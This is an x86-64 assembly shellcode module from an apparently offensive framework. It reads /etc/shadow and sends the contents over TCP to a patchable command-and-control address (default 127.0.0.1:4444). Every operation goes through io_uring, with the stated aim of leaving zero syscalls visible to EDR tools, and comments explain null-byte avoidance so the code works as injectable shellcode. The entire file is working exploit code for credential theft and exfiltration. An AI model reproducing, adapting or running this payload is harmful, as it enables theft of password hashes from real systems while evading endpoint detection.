; ================================================================
; missions/exfil_shadow.asm — Layer 2: exfiltrate /etc/shadow
; ================================================================
; Reference source only — not assembled by the Makefile (it references
; the Layer 0/1 labels of combined/shellcode.asm). The builder renders
; the equivalent ops from the same base at build time.
; ================================================================
; Sequence (all via io_uring, visible EDR syscall count = 0):
;   1. IORING_OP_OPENAT  — open /etc/shadow
;   2. IORING_OP_READ    — read up to 4096 bytes
;   3. IORING_OP_SOCKET  — create TCP socket
;   4. IORING_OP_CONNECT — connect to C2
;   5. IORING_OP_SEND    — send file contents
;   6. exit(0)
;
; Patchable config (see offsets in shellcode.h after build):
;   _config_ip    — 4 bytes, network byte order  (default: 127.0.0.1)
;   _config_port  — 2 bytes, network byte order  (default: 4444 = 0x115c)
;
; Stack frame slots used (see F_* defines in shellcode.asm):
;   F_FILEFD  — result of openat
;   F_SOCKFD  — result of socket
;   F_NBYTES  — bytes read
;   F_SADDR   — sockaddr_in built at runtime
;   F_RBUF    — 4096-byte read buffer
; ================================================================

; ----------------------------------------------------------------
; Opcodes (should match io_uring.h)
; ----------------------------------------------------------------
%define OP_OPENAT   18
%define OP_READ     22
%define OP_SOCKET   45
%define OP_CONNECT  16
%define OP_SEND     26

; ----------------------------------------------------------------
; SQE field byte offsets
; ----------------------------------------------------------------
%define SQ_OPCODE   0   ; u8  opcode
%define SQ_FLAGS    1   ; u8  flags
%define SQ_FD       4   ; s32 fd
%define SQ_OFF      8   ; u64 off
%define SQ_ADDR     16  ; u64 addr (buffer or path pointer)
%define SQ_LEN      24  ; u32 len
%define SQ_OPFLAGS  28  ; u32 op-specific flags (open_flags for OPENAT)
%define SQ_UDATA    32  ; u64 user_data — +32 (NOT +40, which is buf_index)

; ----------------------------------------------------------------
; Mission entry point
; ----------------------------------------------------------------
_mission:

; ---- 1. openat(AT_FDCWD, "/etc/shadow", O_RDONLY) ----
    call _get_sqe              ; rax = zeroed SQE slot
    mov byte [rax + SQ_OPCODE], OP_OPENAT
    mov dword [rax + SQ_FD], -100   ; AT_FDCWD (encodes as 0x9CFFFFFF, no nulls)
    ; path address: computed via r12 delta
    lea rcx, [r12 + _path_shadow - _get_base]
    mov [rax + SQ_ADDR], rcx
    ; SQ_OPFLAGS (+28) = O_RDONLY = 0 (already zeroed by _get_sqe)
    mov qword [rax + SQ_UDATA], 1
    call _io_enter
    call _wait_cqe             ; ecx = file_fd or -errno
    test ecx, ecx
    js _fail
    mov [r13 + F_FILEFD], ecx

; ---- 2. read(file_fd, buf, 4096) ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_READ
    mov ecx, [r13 + F_FILEFD]
    mov [rax + SQ_FD], ecx    ; fd
    ; buf: stack frame at F_RBUF
    lea rcx, [r13 + F_RBUF]
    mov [rax + SQ_ADDR], rcx
    ; len = 4096 = 0x1000 — NULLBYTE: 0x1000 encodes as 00 10 00 00
    ; Use: mov word [rax+SQ_LEN+1], 0x10 (write byte 1 of the dword)
    mov word [rax + SQ_LEN], 0        ; len lo = 0
    mov byte [rax + SQ_LEN + 1], 0x10 ; len = 0x1000 = 4096
    ; Alternative: push 0x1000; pop rcx; mov [rax+SQ_LEN], ecx
    ; That also has nulls. Use the byte trick above.
    mov qword [rax + SQ_UDATA], 2
    call _io_enter
    call _wait_cqe             ; ecx = bytes_read or -errno
    test ecx, ecx
    js _fail
    mov [r13 + F_NBYTES], ecx

; ---- 3. socket(AF_INET, SOCK_STREAM, 0) ----
; For IORING_OP_SOCKET: fd=domain, off=type, len=protocol
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_SOCKET
    mov dword [rax + SQ_FD], 2       ; AF_INET
    mov qword [rax + SQ_OFF], 1      ; SOCK_STREAM (type field uses off)
    ; SQ_LEN = 0 (protocol = default, already zeroed)
    mov qword [rax + SQ_UDATA], 3
    call _io_enter
    call _wait_cqe             ; ecx = sock_fd or -errno
    test ecx, ecx
    js _fail
    mov [r13 + F_SOCKFD], ecx

; ---- 4. connect(sock_fd, &sockaddr_in, 16) ----
; Build sockaddr_in on stack frame at F_SADDR:
;   +0  u16 sin_family = AF_INET = 2
;   +2  u16 sin_port   = config_port (network byte order)
;   +4  u32 sin_addr   = config_ip   (network byte order)
;   +8  u64 sin_zero   = 0 (already zeroed)
    lea rdx, [r13 + F_SADDR]
    mov word [rdx], 2                              ; AF_INET
    ; port: copy from _config_port (big-endian already)
    lea rcx, [r12 + _config_port - _get_base]
    mov cx, word [rcx]
    mov [rdx + 2], cx
    ; ip: copy from _config_ip
    lea rcx, [r12 + _config_ip - _get_base]
    mov ecx, [rcx]
    mov [rdx + 4], ecx

    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_CONNECT
    mov ecx, [r13 + F_SOCKFD]
    mov [rax + SQ_FD], ecx
    lea rcx, [r13 + F_SADDR]
    mov [rax + SQ_ADDR], rcx       ; &sockaddr_in
    ; CONNECT: addrlen goes in sqe->addr2 (SQ_OFF +8), NOT sqe->len (+24)
    ; Kernel io_connect_prep: if (sqe->len || ...) return -EINVAL
    push 0x10
    pop rcx
    mov [rax + SQ_OFF], rcx        ; addr2 = sizeof(sockaddr_in) = 16
    ; SQ_LEN stays 0 (zeroed by _get_sqe)
    mov qword [rax + SQ_UDATA], 4
    call _io_enter
    call _wait_cqe             ; ecx = 0 on success or -errno
    test ecx, ecx
    js _fail

; ---- 5. send(sock_fd, buf, bytes_read, 0) ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_SEND
    mov ecx, [r13 + F_SOCKFD]
    mov [rax + SQ_FD], ecx
    lea rcx, [r13 + F_RBUF]
    mov [rax + SQ_ADDR], rcx
    mov ecx, [r13 + F_NBYTES]
    mov [rax + SQ_LEN], ecx
    ; SQ_OPFLAGS (+28) = MSG_flags = 0 (already zeroed)
    mov qword [rax + SQ_UDATA], 5
    call _io_enter
    call _wait_cqe             ; ecx = bytes_sent or -errno

; ---- 6. exit(0) ----
_exit_clean:
    xor edi, edi               ; exit code = 0
    push SYS_EXIT
    pop rax
    syscall

; ---- error exit ----
_fail:
    push 1
    pop rdi                    ; exit code = 1
    push SYS_EXIT
    pop rax
    syscall

; ================================================================
; Read-only data (accessed via r12 delta)
; ================================================================
_path_shadow: db '/etc/shadow', 0

; Patchable config — document offsets via extract.py
_config_ip:   db 127, 0, 0, 1       ; 4 bytes: C2 IP in network order
_config_port: db 0x11, 0x5c         ; 2 bytes: 4444 in big-endian (0x115c)
